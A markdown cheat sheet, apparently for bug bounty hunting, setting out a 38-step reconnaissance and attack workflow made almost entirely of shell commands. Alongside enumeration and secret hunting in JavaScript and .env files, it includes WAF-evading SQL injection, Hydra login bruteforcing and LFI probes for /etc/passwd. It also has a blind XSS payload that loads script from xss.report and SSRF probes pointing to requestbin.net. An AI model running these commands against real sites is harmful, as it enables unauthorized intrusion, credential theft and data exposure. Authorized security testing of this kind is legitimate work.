# 🔍 Full Recon + Vuln Scan Automation Workflow (Updated 2025)

---

## ✅ 1. Subdomain Enumeration
```bash
subfinder -d example.com -all -recursive -o subdomains.txt
assetfinder --subs-only example.com >> subdomains.txt
amass enum -passive -d example.com -o amass.txt
cat *.txt | sort -u > final_subdomains.txt
```

## 🌐 2. Live Subdomain Check
```bash
cat final_subdomains.txt | httpx-toolkit -ports 80,443,8080,8443 -silent -threads 200 -o alive.txt
```

## 🕸️ 3. URL & Parameter Collection
```bash
cat alive.txt | gau --threads 100 | grep "=" | urldedupe > gau_urls.txt
katana -list alive.txt -d 5 -ps -pss -jc -fx -o katana_urls.txt
waymore -i example.com --mode U --mc 200,302 > waymore.txt
cat *.txt | urldedupe | grep "=" | anew all_urls.txt
```

## 🧪 4. Filter Useful URLs
```bash
cat all_urls.txt | grep -E '\.php|\.asp|\.aspx|\.jsp|\.cfm' | sed 's/=.*/=/' | sort -u > filtered.txt
```

## 💣 5. Custom Scanner
```bash
python3 lostsec.py -l filtered.txt -p payloads/xor.txt -t 5
```

## 🔍 6. JavaScript File Enumeration + Secret Finder
```bash
cat all_urls.txt | grep "\.js$" > js.txt
cat js.txt | while read url; do python3 ~/SecretFinder/SecretFinder.py -i $url -o cli; done
```

## 🔓 7. Sensitive Files Enumeration
```bash
cat all_urls.txt | grep -Ei '\.zip|\.log|\.sql|\.db|\.env|\.gz|\.rar|\.tar|\.bak|\.old|\.yml|\.json|\.backup|\.secret' > sensitive.txt
```

## 🔥 8. Directory Bruteforce
```bash
dirsearch -u https://example.com -e bak,backup,conf,db,sql,json,env,log,old,zip,tar.gz,jar,js,rb,py,txt
```

## 🧬 9. Vulnerability Pattern Matching
```bash
cat all_urls.txt | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/bluediving2024></script>'
```

## 🛡️ 10. WAF Bypass SQLi
```bash
sqlmap -u "https://site.com/page.php?id=1" --dbs --batch --risk=3 --level=5 \
--random-agent --tamper=space2comment,between,randomcase -v 3
```

## 🌀 11. CORS Misconfig Scanner
```bash
python3 corsy.py -i alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
```

## 🛠️ 12. Subdomain Takeover Check
```bash
subzy run --targets final_subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```

## 📦 13. JS Exposure Vuln Scan
```bash
cat js.txt | nuclei -t ~/nuclei-templates/http/exposures -c 30
```

## ⚔️ 14. CVE & Tech Detection
```bash
nuclei -list alive.txt -tags cves,osint,tech -severity high,critical -c 100
```

## 🔐 15. Open Redirect Dork
```bash
site:example.com inurl:redir | inurl:redirect | inurl:return | inurl:url= | inurl=src=http
```

## 🔗 16. Custom Wordlist from JS
```bash
katana -u https://example.com -jc -f qurl -o js_paths.txt
paramspider -d example.com -o spider.txt
```

## 🧠 17. SQLi Fuzz via Ghauri
```bash
ghauri -u "https://site.com/page?id=*" --batch --confirm --dbs
```

## 🌍 18. Extra Data Sources
```bash
waybackurls example.com > wb.txt
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com" > urlscan.json
```

## ✅ Bonus: Open Redirect Detection
```bash
cat all_urls.txt | gf redirect | grep '?redirect_url' | urldedupe > open_redirect.txt
```

## 🔄 API Integrations
```bash
# Wayback:
https://web.archive.org/cdx/search/cdx?url=*.example.com&fl=original&collapse=urlkey

# UrlScan:
https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000

# VirusTotal:
https://www.virustotal.com/vtapi/v2/domain/report?apikey=YOUR_API_KEY&domain=example.com
```

---

# 🔄 Advanced Recon + Vuln Scan Workflow (2025 Pro Edition)

## 🛰️ 19. DNS Bruteforce + Zone Transfer
```bash
dnsx -l final_subdomains.txt -a -aaaa -cname -ns -mx -ptr -soa -srv -txt -silent > dns_output.txt

for domain in $(cat subdomains.txt); do
dig axfr @$domain $domain
done
```

## 🛡️ 20. Firewall/CDN/WAF Detection
```bash
wafw00f https://example.com
whatwaf -u https://example.com --ra --tor
```

## 🧠 21. Reverse IP Lookup
```bash
curl "https://api.hackertarget.com/reverseiplookup/?q=example.com"
```

## 🔐 22. Login Page Detection + Bruteforce
```bash
katana -list alive.txt -d 3 -jc -fx | grep -Ei "login|signin|admin" > login_pages.txt

hydra -L users.txt -P passwords.txt example.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

## 📦 23. Cloud Storage Misconfig
```bash
s3scanner scan -f subdomains.txt
gcpbucket_enum -l subdomains.txt
```

## 🔎 24. JS Source Code Analysis
```bash
cat js.txt | while read url; do
curl -s "$url" | js-beautify - | grep -Ei 'apikey|token|secret|auth|key'
done
```

## 🧬 25. GitHub Dorking
```bash
python3 GitDorker.py -tf tokens.txt -q "org:example.com filename:.env" -dorks dorks.txt
```

## 🧪 26. API Enumeration
```bash
cat all_urls.txt | grep -Ei "swagger|api-docs|openapi.json" > api_docs.txt
nuclei -list api_docs.txt -t nuclei-templates/http/exposures/apis
```

## ⚙️ 27. SSRF Detection
```bash
cat all_urls.txt | gf ssrf | qsreplace "http://requestbin.net/r/ssrf123" | httpx -silent
```

## 🏹 28. Host Header Injection
```bash
cat alive.txt | nuclei -t http/host-header -c 50
```

## 🗃️ 29. Database Exposure
```bash
cat all_urls.txt | grep -Ei "\.sql$|\.env$|\.db$|\.sqlite$|\.bak$" > leaks.txt
```

## 🧪 30. SSTI / Template Injection
```bash
cat all_urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent
```

## 🔑 31. Firebase / Supabase
```bash
cat js.txt | grep -Ei "firebaseio.com|supabase.co"
```

## 🚨 32. Broken Link Hijack
```bash
linkfinder -i https://example.com -o cli | grep 404
```

## 📌 33. GitHub Subdomain Discovery
```bash
github-subdomains -d example.com -t GITHUB_TOKEN -o github_subs.txt
```

## 🔐 34. CORS Misconfig (Advanced)
```bash
python3 corscanner.py -i alive.txt -t 20
```

## 🎯 35. LFI/RFI Discovery
```bash
cat all_urls.txt | gf lfi | qsreplace "../../../../etc/passwd" | httpx -silent
```

## ⚔️ 36. XSS via Dalfox
```bash
dalfox file all_urls.txt --custom-payload payloads/xss.txt --output xss_report.txt
```

## 📦 37. Advanced SQLi
```bash
ghauri -l filtered.txt --batch --level 5 --confirm --tamper randomcase --timeout 10 --delay 0
```

## 📑 38. Output Management
```bash
mkdir results
mv *_output.txt results/
mv *_urls.txt results/
mv *_report.txt results/
```

---

# 📁 Bonus Tools to Integrate
* gauplus
* arjun
* kxss
* jsparser
* gf-patterns
* URLextract
